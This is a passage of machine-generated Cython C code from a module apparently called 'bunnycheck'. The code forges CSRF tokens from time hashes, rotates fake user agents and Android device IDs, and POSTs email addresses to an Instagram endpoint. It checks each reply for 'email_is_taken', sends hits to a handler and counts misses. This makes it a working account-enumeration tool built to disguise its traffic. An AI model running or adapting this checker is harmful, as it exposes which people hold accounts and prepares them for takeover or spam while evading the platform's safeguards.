  __pyx_t_2 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (__Pyx_SetNameInClass(__pyx_t_1, __pyx_n_s_sgin, __pyx_t_2) < 0) __PYX_ERR(0, 355, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_token_hex); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 356, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_7);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_7, function);
    }
  }
  __pyx_t_2 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_4, __pyx_int_8) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_int_8);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 356, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 356, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Multiply(__pyx_t_7, __pyx_int_2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 356, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (__Pyx_SetNameInClass(__pyx_t_1, __pyx_n_s_csr, __pyx_t_2) < 0) __PYX_ERR(0, 356, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_uuid); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 357, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 357, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_7)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_7);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_2 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 357, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_hex); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 357, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetSlice(__pyx_t_4, 0, 16, NULL, NULL, &__pyx_slice__38, 0, 1, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 357, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 357, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyUnicode_Concat(__pyx_kp_u_android, __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 357, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (__Pyx_SetNameInClass(__pyx_t_1, __pyx_n_s_android_2, __pyx_t_2) < 0) __PYX_ERR(0, 357, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Py3ClassCreate(((PyObject*)&__Pyx_DefaultClassType), __pyx_n_s_Variable, __pyx_empty_tuple, __pyx_t_1, NULL, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 352, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_v_Variable = __pyx_t_2;
  __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_v_Variable); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 358, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_variable_instance = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_10bunnycheck_1bunny_user_agent, 0, __pyx_n_s_bunnycheck_locals_bunny_user_age, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__40)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 360, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_bunny_user_agent = __pyx_t_1;
  __pyx_t_1 = 0;

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_11, &__pyx_t_12, &__pyx_t_13);
    __Pyx_XGOTREF(__pyx_t_11);
    __Pyx_XGOTREF(__pyx_t_12);
    __Pyx_XGOTREF(__pyx_t_13);
    /*try:*/ {

      
      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 391, __pyx_L9_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 391, __pyx_L9_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = PyList_New(4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 391, __pyx_L9_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_INCREF(__pyx_int_1);
      __Pyx_GIVEREF(__pyx_int_1);
      PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_1);
      __Pyx_INCREF(__pyx_int_2);
      __Pyx_GIVEREF(__pyx_int_2);
      PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_2);
      __Pyx_INCREF(__pyx_int_3);
      __Pyx_GIVEREF(__pyx_int_3);
      PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_3);
      __Pyx_INCREF(__pyx_int_4);
      __Pyx_GIVEREF(__pyx_int_4);
      PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_4);
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_7, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_2);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 391, __pyx_L9_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_method = __pyx_t_1;
      __pyx_t_1 = 0;

      
      __pyx_t_1 = __Pyx_PyInt_EqObjC(__pyx_v_method, __pyx_int_1, 1, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 392, __pyx_L9_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_14 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_14 < 0)) __PYX_ERR(0, 392, __pyx_L9_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (__pyx_t_14) {

        
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_md5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 393, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_time); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 393, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_8 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_3);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
          }
        }
        __pyx_t_7 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 393, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 393, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = PyUnicode_AsEncodedString(((PyObject*)__pyx_t_3), NULL, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 393, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
          }
        }
        __pyx_t_4 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_7);
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 393, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_hexdigest); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 393, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
          }
        }
        __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 393, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_v_csrftoken = __pyx_t_1;
        __pyx_t_1 = 0;

        
        __pyx_t_1 = __Pyx_PyDict_NewPresized(7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 395, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_accept, __pyx_kp_u__5) < 0) __PYX_ERR(0, 395, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_accept_language, __pyx_kp_u_en_US_en_q_0_9) < 0) __PYX_ERR(0, 395, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_content_type, __pyx_kp_u_application_x_www_form_urlencode_2) < 0) __PYX_ERR(0, 395, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_origin, __pyx_kp_u_https_www_instagram_com_2) < 0) __PYX_ERR(0, 395, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_referer, __pyx_kp_u_https_www_instagram_com_accounts) < 0) __PYX_ERR(0, 395, __pyx_L9_error)

        
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 400, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_7 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
          }
        }
        __pyx_t_2 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 400, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_user_agent, __pyx_t_2) < 0) __PYX_ERR(0, 395, __pyx_L9_error)
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

        
        if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_x_csrftoken, __pyx_v_csrftoken) < 0) __PYX_ERR(0, 395, __pyx_L9_error)
        __pyx_v_headers = ((PyObject*)__pyx_t_1);
        __pyx_t_1 = 0;

        
        __pyx_t_1 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 402, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_email, __pyx_v_email) < 0) __PYX_ERR(0, 402, __pyx_L9_error)
        __pyx_v_data = ((PyObject*)__pyx_t_1);
        __pyx_t_1 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_requests); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 403, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_post); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 403, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

        
        __pyx_t_1 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 405, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 405, __pyx_L9_error)

        
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 405, __pyx_L9_error)

        
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__41, __pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 403, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_v_response = __pyx_t_4;
        __pyx_t_4 = 0;

        
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_text); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 407, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 407, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_14 = (__Pyx_PyUnicode_ContainsTF(__pyx_n_u_email_is_taken, __pyx_t_1, Py_EQ)); if (unlikely(__pyx_t_14 < 0)) __PYX_ERR(0, 407, __pyx_L9_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_15 = (__pyx_t_14 != 0);
        if (__pyx_t_15) {

          
          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_bunny); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 408, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_2 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_2)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
              __Pyx_INCREF(__pyx_t_2);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_4, function);
            }
          }
          __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_2, __pyx_v_email) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_v_email);
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 408, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          goto __pyx_L16;
        }

        
        /*else*/ {
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_kotu_insta); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 410, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_4 = __Pyx_PyInt_AddObjC(__pyx_t_1, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 410, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          if (PyDict_SetItem(__pyx_d, __pyx_n_s_kotu_insta, __pyx_t_4) < 0) __PYX_ERR(0, 410, __pyx_L9_error)
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __pyx_L16:;

        
        goto __pyx_L15;
      }

      
      __pyx_t_4 = __Pyx_PyInt_EqObjC(__pyx_v_method, __pyx_int_2, 2, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 411, __pyx_L9_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_15 = __Pyx_PyObject_IsTrue(__pyx_t_4); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 411, __pyx_L9_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (__pyx_t_15) {

        
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 412, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_2 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
          __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
          if (likely(__pyx_t_2)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_2);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_1, function);
          }
        }
        __pyx_t_4 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 412, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_v_ua = __pyx_t_4;
        __pyx_t_4 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_md5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 413, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_time); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 413, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_8 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_3);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
          }
        }
        __pyx_t_7 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 413, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 413, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = PyUnicode_AsEncodedString(((PyObject*)__pyx_t_3), NULL, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 413, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
          }
        }
        __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_7);
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 413, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_hexdigest); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 413, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
          }
        }
        __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 413, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_v_csrftoken = __pyx_t_4;
        __pyx_t_4 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_hashlib); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 415, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_md5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 415, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_uuid); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 415, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 415, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_8);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_8, function);
          }
        }
        __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 415, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 415, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
